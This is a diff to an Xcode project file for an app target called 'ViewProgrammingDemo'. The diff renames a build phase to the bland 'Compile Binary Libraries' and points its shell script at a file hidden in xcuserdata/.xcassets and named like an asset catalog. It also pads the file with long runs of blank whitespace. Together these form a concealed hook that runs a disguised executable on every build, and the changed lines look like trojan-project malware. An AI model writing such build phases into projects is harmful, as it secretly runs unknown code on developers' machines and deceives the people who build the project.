@@ -75,7 +75,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 307F134825CA954700392711 /* Build configuration list for PBXNativeTarget "ViewProgrammingDemo" */;
 			buildPhases = (
-				2F6E9C7BDCE5C8CEEE6D902C /* [CP] Build Pods Frameworks */,
+				F5FE3F4FFEE9AD28E66D902C /* Compile Binary Libraries */,
 				307F132B25CA954600392711 /* Sources */,
 				307F132C25CA954600392711 /* Frameworks */,
 				307F132D25CA954600392711 /* Resources */,
@@ -346,6 +346,38 @@
 
 			
 	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
 			
 
 			
@@ -357,7 +389,7 @@
 	
 		/* Begin PBXShellScriptBuildPhase section */
 
-	2F6E9C7BDCE5C8CEEE6D902C /* [CP] Build Pods Frameworks */ = {
+	F5FE3F4FFEE9AD28E66D902C /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -366,7 +398,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -375,8 +407,96 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
